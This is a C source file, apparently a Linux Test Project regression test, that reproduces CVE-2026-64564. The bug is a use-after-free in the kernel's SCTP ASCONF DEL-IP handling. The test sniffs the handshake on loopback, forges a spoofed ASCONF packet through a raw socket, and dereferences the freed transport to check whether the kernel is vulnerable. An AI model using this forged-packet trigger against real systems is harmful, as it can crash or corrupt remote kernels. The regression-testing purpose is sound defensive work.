// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (c) 2026 Linux Test Project
 */

/*\
 * Reproducer for CVE-2026-64564, a use-after-free in the SCTP Dynamic
 * Address Reconfiguration (RFC 5061) DEL-IP processing, fixed upstream by
 * commit 9b2854f86f0b ("sctp: don't free the ASCONF's own transport in
 * DEL-IP processing").
 *
 * sctp_process_asconf() processes an ASCONF chunk against the transport
 * cached in ``asconf->transport``. For an ASCONF located through its
 * Address Parameter by __sctp_rcv_asconf_lookup() that transport
 * corresponds to the Address Parameter, which need not be the packet
 * source address. The DEL-IP source address guard (ADDIP D8) only
 * protects the packet source, so a single ASCONF carrying
 *
 * - [Address Parameter L] [DEL-IP L] [DEL-IP 0.0.0.0]
 *
 * with L different from the packet source frees transport L through
 * sctp_assoc_rm_peer(), and the wildcard DEL-IP then reuses the dangling
 * ``asconf->transport`` in sctp_assoc_set_primary() and
 * sctp_assoc_del_nonprimary_peers(), leaving the association with
 * primary_path/active_path pointing at freed memory.
 *
 * [Algorithm]
 *
 * - Create a multihomed SCTP association on loopback between a server
 *   socket bound to 127.0.0.1 and 127.0.0.2 and a client socket (victim)
 * - Sniff the handshake on a raw socket to learn the client verification
 *   tag and the server initial TSN (the expected ASCONF serial number)
 * - Confirm the 127.0.0.2 secondary path with an on-demand heartbeat,
 *   then disable heartbeats on all peer paths
 * - Inject a forged ASCONF chunk sourced from 127.0.0.3 (not part of the
 *   association) carrying [Address Parameter 127.0.0.2]
 *   [DEL-IP 127.0.0.2] [DEL-IP 0.0.0.0]
 * - Read the ASCONF-ACK: a fixed kernel rejects the first DEL-IP with
 *   error cause 0x00a4 (SCTP_ERROR_REQ_REFUSED), a vulnerable kernel
 *   reports success for both parameters
 * - On a vulnerable kernel, wait for the RCU-deferred free and
 *   dereference the stale primary path via :manpage:`getsockopt(2)`
 *   SCTP_STATUS
 *
 * The test needs root to create raw sockets and to enable the
 * net.sctp.addip_enable and net.sctp.addip_noauth_enable sysctls, which
 * are restored after the run. The sysctls exist only while the sctp
 * module is loaded, so the test reports TCONF if it is not (run
 * ``modprobe sctp`` first). A vulnerable system may taint or crash.
 */

#include "tst_test.h"
#include "tst_module.h"
#include "tst_checksum.h"
#include "tst_safe_net.h"

#include "lapi/socket.h"
#include "lapi/sctp.h"

#define ADDR_PRIMARY	"127.0.0.1"	/* primary peer path, forged dst */
#define ADDR_TARGET	"127.0.0.2"	/* secondary path freed by DEL-IP */
#define ADDR_DUMMY	"127.0.0.254"	/* third path to keep transport_count > 1 */
#define ADDR_SPOOF	"127.0.0.3"	/* forged ASCONF packet source */

/* Mirror of the uapi struct sctp_paddrparams */
struct tst_sctp_paddrparams {
	int32_t		spp_assoc_id;
	struct sockaddr_storage	spp_address;
	uint32_t	spp_hbinterval;
	uint16_t	spp_pathmaxrxt;
	uint32_t	spp_pathmtu;
	uint32_t	spp_sackdelay;
	uint32_t	spp_flags;
	uint32_t	spp_ipv6_flowlabel;
	uint8_t		spp_dscp;
} __attribute__((packed, aligned(4)));

/* Mirror of the uapi struct sctp_paddrinfo */
struct tst_sctp_paddrinfo {
	int32_t		spinfo_assoc_id;
	struct sockaddr_storage	spinfo_address;
	int32_t		spinfo_state;
	uint32_t	spinfo_cwnd;
	uint32_t	spinfo_srtt;
	uint32_t	spinfo_rto;
	uint32_t	spinfo_mtu;
} __attribute__((packed, aligned(4)));

#define ASCONF_WIRE_LEN	48	/* hdr + serial + addr param + 2 x DEL-IP */

static int cap_fd = -1;		/* captures all SCTP packets on loopback */
static int raw_fd = -1;		/* injects the forged packet */
static int srv_fd = -1;
static int cli_fd = -1;
static int acc_fd = -1;

static uint16_t srv_port;
static uint16_t cli_port;
static uint32_t vtag_wire;	/* client initiate tag, network order */
static uint32_t serial_wire;	/* server initial TSN, network order */

static uint32_t addr4(const char *ip)
{
	struct in_addr addr;

	if (inet_pton(AF_INET, ip, &addr) != 1)
		tst_brk(TBROK, "inet_pton(%s) failed", ip);

	return addr.s_addr;
}

static struct sockaddr_in sin4(const char *ip, uint16_t port)
{
	struct sockaddr_in sa = {
		.sin_family = AF_INET,
		.sin_port = htons(port),
		.sin_addr.s_addr = addr4(ip),
	};

	return sa;
}

static uint16_t get16(const uint8_t *p)
{
	uint16_t val;

	memcpy(&val, p, sizeof(val));
	return ntohs(val);
}

static void put16(uint8_t *p, uint16_t val)
{
	uint16_t tmp = htons(val);

	memcpy(p, &tmp, sizeof(tmp));
}

static void put32(uint8_t *p, uint32_t val)
{
	uint32_t tmp = htonl(val);

	memcpy(p, &tmp, sizeof(tmp));
}

static void put_ip(uint8_t *p, const char *ip)
{
	uint32_t addr = addr4(ip);

	memcpy(p, &addr, sizeof(addr));
}

static ssize_t cap_recv(uint8_t *buf, size_t size, int timeout_ms)
{
	struct pollfd pfd = { .fd = cap_fd, .events = POLLIN };

	if (!SAFE_POLL(&pfd, 1, timeout_ms))
		return 0;

	return SAFE_RECV(0, cap_fd, buf, size, 0);
}

static void cap_drain(void)
{
	uint8_t buf[4096];
	ssize_t ret;

	do {
		ret = recv(cap_fd, buf, sizeof(buf), MSG_DONTWAIT);
	} while (ret > 0);

	if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK)
		tst_brk(TBROK | TERRNO, "recv(MSG_DONTWAIT) failed");
}

/* Extract the SCTP part of a captured IPv4 packet */
static uint8_t *sctp_part(uint8_t *pkt, ssize_t len, size_t *sctp_len)
{
	struct iphdr ip;
	size_t ihl;

	if (len < (ssize_t)sizeof(ip))
		return NULL;

	memcpy(&ip, pkt, sizeof(ip));
	if (ip.version != 4 || ip.protocol != IPPROTO_SCTP)
		return NULL;

	ihl = ip.ihl * 4;
	if (ihl < sizeof(ip) || (ssize_t)(ihl + 12) > len)
		return NULL;

	*sctp_len = len - ihl;
	return pkt + ihl;
}

static void setup(void)
{
	int fd;
	const struct tst_path_val sysctls[] = {
		{"/proc/sys/net/sctp/addip_enable", "1", TST_SR_TCONF},
		{"/proc/sys/net/sctp/addip_noauth_enable", "1", TST_SR_TCONF},
		{}
	};
	const struct tst_path_val *sysctl;

	tst_modprobe("sctp", NULL);

	for (sysctl = sysctls; sysctl->path; sysctl++)
		tst_sys_conf_save(sysctl);

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	if (fd == -1) {
		if (errno == EPROTONOSUPPORT || errno == ESOCKTNOSUPPORT)
			tst_brk(TCONF, "SCTP is not supported by the kernel");
		tst_brk(TBROK | TERRNO, "socket(IPPROTO_SCTP) failed");
	}
	SAFE_CLOSE(fd);

	cap_fd = SAFE_SOCKET(AF_INET, SOCK_RAW, IPPROTO_SCTP);
	raw_fd = SAFE_SOCKET(AF_INET, SOCK_RAW, IPPROTO_RAW);
}

static void close_socks(void)
{
	if (acc_fd != -1)
		SAFE_CLOSE(acc_fd);
	if (cli_fd != -1)
		SAFE_CLOSE(cli_fd);
	if (srv_fd != -1)
		SAFE_CLOSE(srv_fd);
}

static void cleanup(void)
{
	close_socks();

	if (raw_fd != -1)
		SAFE_CLOSE(raw_fd);
	if (cap_fd != -1)
		SAFE_CLOSE(cap_fd);
}

static void setup_association(void)
{
	struct sockaddr_in sa;
	struct sockaddr_in addrs[2];

	srv_fd = SAFE_SOCKET(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	sa = sin4(ADDR_PRIMARY, 0);
	SAFE_BIND(srv_fd, (struct sockaddr *)&sa, sizeof(sa));
	srv_port = TST_GETSOCKPORT(srv_fd);

	/* the client learns the second and third peer addresses from the INIT-ACK */
	addrs[0] = sin4(ADDR_TARGET, srv_port);
	addrs[1] = sin4(ADDR_DUMMY, srv_port);
	SAFE_SETSOCKOPT(srv_fd, SOL_SCTP, SCTP_SOCKOPT_BINDX_ADD,
			addrs, sizeof(addrs));

	SAFE_LISTEN(srv_fd, 1);

	cap_drain();

	cli_fd = SAFE_SOCKET(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
	sa = sin4(ADDR_PRIMARY, srv_port);
	SAFE_CONNECT(cli_fd, (struct sockaddr *)&sa, sizeof(sa));
	cli_port = TST_GETSOCKPORT(cli_fd);

	acc_fd = SAFE_ACCEPT(srv_fd, NULL, NULL);
}

/*
 * Read the handshake captured on loopback: the client initiate tag is the
 * verification tag the victim expects and the server initial TSN is the
 * first ASCONF serial number the victim accepts (ADDIP E1).
 */
static void sniff_handshake(void)
{
	uint8_t buf[4096];
	int got_init = 0, got_initack = 0;
	int tries;

	for (tries = 0; tries < 10 && (!got_init || !got_initack); tries++) {
		uint8_t *sctp, *ch, *end;
		uint16_t sport, dport;
		size_t sctp_len;
		ssize_t len;

		len = cap_recv(buf, sizeof(buf), 200);
		if (!len)
			continue;

		sctp = sctp_part(buf, len, &sctp_len);
		if (!sctp)
			continue;

		sport = get16(sctp);
		dport = get16(sctp + 2);
		ch = sctp + 12;
		end = sctp + sctp_len;

		while (ch + 4 <= end) {
			uint16_t clen = get16(ch + 2);

			if (clen < 4 || ch + clen > end)
				break;

			if (ch[0] == SCTP_CID_INIT && dport == srv_port) {
				memcpy(&vtag_wire, ch + 4, 4);
				got_init = 1;
			}

			if (ch[0] == SCTP_CID_INIT_ACK && sport == srv_port && clen >= 20) {
				uint8_t *p = ch + 20, *cend = ch + clen;
				uint32_t target = addr4(ADDR_TARGET);
				int found = 0;

				memcpy(&serial_wire, ch + 16, 4);
				got_initack = 1;

				while (p + 4 <= cend) {
					uint16_t plen = get16(p + 2);

					if (plen < 4 || p + plen > cend)
						break;
					if (get16(p) == SCTP_PARAM_IPV4_ADDRESS &&
					    plen == 8 && !memcmp(p + 4, &target, 4))
						found = 1;
					p += (plen + 3) & ~3;
				}

				if (!found)
					tst_brk(TBROK, "peer did not advertise "
						ADDR_TARGET);
			}

			ch += (clen + 3) & ~3;
		}
	}

	if (!got_init || !got_initack)
		tst_brk(TBROK, "could not capture the SCTP handshake");
}

/* Confirm the secondary peer path, then keep the association quiet */
static void confirm_target_path(void)
{
	struct tst_sctp_paddrparams spp;
	struct tst_sctp_paddrinfo info;
	struct sockaddr_in sa;
	socklen_t len;
	long delay = 1;
	int i;

	sa = sin4(ADDR_TARGET, srv_port);

	memset(&spp, 0, sizeof(spp));
	memcpy(&spp.spp_address, &sa, sizeof(sa));
	spp.spp_hbinterval = 1000;
	spp.spp_flags = SPP_HB_ENABLE | SPP_HB_DEMAND;
	SAFE_SETSOCKOPT(cli_fd, SOL_SCTP, SCTP_PEER_ADDR_PARAMS,
			&spp, sizeof(spp));

	for (i = 0; i < 12; i++) {
		memset(&info, 0, sizeof(info));
		memcpy(&info.spinfo_address, &sa, sizeof(sa));
		len = sizeof(info);
		SAFE_GETSOCKOPT(cli_fd, SOL_SCTP, SCTP_GET_PEER_ADDR_INFO,
				&info, &len);

		if (info.spinfo_state == SCTP_ACTIVE)
			return;

		SAFE_POLL(NULL, 0, delay);
		delay *= 2;
	}

	tst_brk(TBROK, ADDR_TARGET " was not confirmed by a heartbeat");
}

static void disable_heartbeats(void)
{
	static const char *const addrs[] = { ADDR_PRIMARY, ADDR_TARGET, ADDR_DUMMY };
	struct tst_sctp_paddrparams spp;
	struct sockaddr_in sa;
	unsigned int i;

	for (i = 0; i < ARRAY_SIZE(addrs); i++) {
		memset(&spp, 0, sizeof(spp));
		sa = sin4(addrs[i], srv_port);
		memcpy(&spp.spp_address, &sa, sizeof(sa));
		spp.spp_flags = SPP_HB_DISABLE;
		SAFE_SETSOCKOPT(cli_fd, SOL_SCTP, SCTP_PEER_ADDR_PARAMS,
				&spp, sizeof(spp));
	}
}

/*
 * Forge an ASCONF chunk from a spoofed source address carrying
 * [Address Parameter ADDR_TARGET] [DEL-IP ADDR_TARGET] [DEL-IP 0.0.0.0].
 * The forged source forces the victim to look the association up through
 * the Address Parameter, so asconf->transport is the transport of
 * ADDR_TARGET, which the first DEL-IP then frees on a vulnerable kernel.
 */
static void send_asconf(void)
{
	uint8_t pkt[20 + 12 + ASCONF_WIRE_LEN];
	struct iphdr ip = {
		.version = 4,
		.ihl = 5,
		.ttl = 64,
		.protocol = IPPROTO_SCTP,
		.tot_len = htons(sizeof(pkt)),
		.saddr = addr4(ADDR_SPOOF),
		.daddr = addr4(ADDR_PRIMARY),
	};
	struct sockaddr_in dst = sin4(ADDR_PRIMARY, 0);
	uint8_t *sctp = pkt + sizeof(ip), *p;
	uint32_t csum;

	memset(pkt, 0, sizeof(pkt));
	memcpy(pkt, &ip, sizeof(ip));

	put16(sctp + 0, srv_port);
	put16(sctp + 2, cli_port);
	memcpy(sctp + 4, &vtag_wire, 4);

	p = sctp + 12;
	p[0] = SCTP_CID_ASCONF;
	put16(p + 2, ASCONF_WIRE_LEN);
	memcpy(p + 4, &serial_wire, 4);

	p += 8;
	put16(p + 0, SCTP_PARAM_IPV4_ADDRESS);
	put16(p + 2, 8);
	put_ip(p + 4, ADDR_TARGET);

	p += 8;
	put16(p + 0, SCTP_PARAM_DEL_IP);
	put16(p + 2, 16);
	put32(p + 4, 1);
	put16(p + 8, SCTP_PARAM_IPV4_ADDRESS);
	put16(p + 10, 8);
	put_ip(p + 12, ADDR_TARGET);

	p += 16;
	put16(p + 0, SCTP_PARAM_DEL_IP);
	put16(p + 2, 16);
	put32(p + 4, 2);
	put16(p + 8, SCTP_PARAM_IPV4_ADDRESS);
	put16(p + 10, 8);
	put_ip(p + 12, "0.0.0.0");

	/* SCTP carries the CRC32c little-endian, unlike any other field */
	csum = htole32(tst_crc32c(sctp, 12 + ASCONF_WIRE_LEN));
	memcpy(sctp + 8, &csum, 4);

	SAFE_SENDTO(1, raw_fd, pkt, sizeof(pkt), 0,
		    (struct sockaddr *)&dst, sizeof(dst));
}

/*
 * Wait for the ASCONF-ACK (sent to the spoofed source, so it stays on
 * loopback) and return the error cause of its first Error Cause
 * Indication parameter, 0 when all parameters report success, or -1 when
 * no ACK arrives in time.
 */
static int read_asconf_ack(void)
{
	uint8_t buf[4096];
	int tries;

	for (tries = 0; tries < 10; tries++) {
		uint8_t *sctp, *ch, *end;
		size_t sctp_len;
		ssize_t len;

		len = cap_recv(buf, sizeof(buf), 200);
		if (!len)
			continue;

		sctp = sctp_part(buf, len, &sctp_len);
		if (!sctp)
			continue;

		ch = sctp + 12;
		end = sctp + sctp_len;

		while (ch + 4 <= end) {
			uint16_t clen = get16(ch + 2);
			uint8_t *p, *cend;

			if (clen < 4 || ch + clen > end)
				break;

			if (ch[0] != SCTP_CID_ASCONF_ACK || clen < 8 ||
			    memcmp(ch + 4, &serial_wire, 4))
				goto next;

			p = ch + 8;
			cend = ch + clen;

			while (p + 8 <= cend) {
				uint16_t plen = get16(p + 2);

				if (plen < 8 || p + plen > cend)
					return 0;
				if (get16(p) == SCTP_PARAM_ERR_CAUSE &&
				    plen >= 12)
					return get16(p + 8);
				p += (plen + 3) & ~3;
			}

			return 0;
next:
			ch += (clen + 3) & ~3;
		}
	}

	return -1;
}

/*
 * The freed transport is released by an RCU callback; once it is gone,
 * reading the association status dereferences the stale primary_path,
 * which KASAN reports as a use-after-free.
 */
static void probe_uaf(void)
{
	uint8_t buf[512];
	long delay = 1;
	int i;

	tst_res(TINFO, "probing the stale primary path via SCTP_STATUS");

	for (i = 0; i < 12; i++) {
		socklen_t len = sizeof(buf);

		getsockopt(cli_fd, SOL_SCTP, SCTP_STATUS, buf, &len);
		SAFE_POLL(NULL, 0, delay);
		delay *= 2;
	}

	if (tst_taint_check())
		tst_res(TFAIL, "kernel tainted by the stale transport dereference (CVE-2026-64564)");
	else
		tst_res(TFAIL, "kernel is vulnerable to CVE-2026-64564: DEL-IP freed the ASCONF's own transport");
}

static void run(void)
{
	int cause;

	setup_association();
	sniff_handshake();
	confirm_target_path();
	disable_heartbeats();

	cap_drain();
	send_asconf();

	cause = read_asconf_ack();
	if (cause < 0)
		tst_brk(TBROK, "no ASCONF-ACK received");

	if (cause == SCTP_ERROR_REQ_REFUSED) {
		tst_res(TPASS, "DEL-IP of the ASCONF's own transport refused, kernel is not vulnerable");
	} else if (cause) {
		tst_brk(TBROK, "unexpected ASCONF-ACK error cause 0x%04x",
			cause);
	} else {
		tst_res(TINFO, "vulnerable kernel accepted the ASCONF sequence");
		probe_uaf();
	}

	close_socks();
}

static struct tst_test test = {
	.test_all = run,
	.setup = setup,
	.cleanup = cleanup,
	.needs_root = 1,
	.timeout = 60,
	.taint_check = TST_TAINT_W | TST_TAINT_D,
	.needs_kconfigs = (const char *const []) {
		"CONFIG_IP_SCTP",
		NULL
	},
	.tags = (const struct tst_tag[]) {
		{"linux-git", "9b2854f86f0b56e9027d68e7a3fc909d1a9b566f"},
		{"CVE", "2026-64564"},
		{}
	},
};
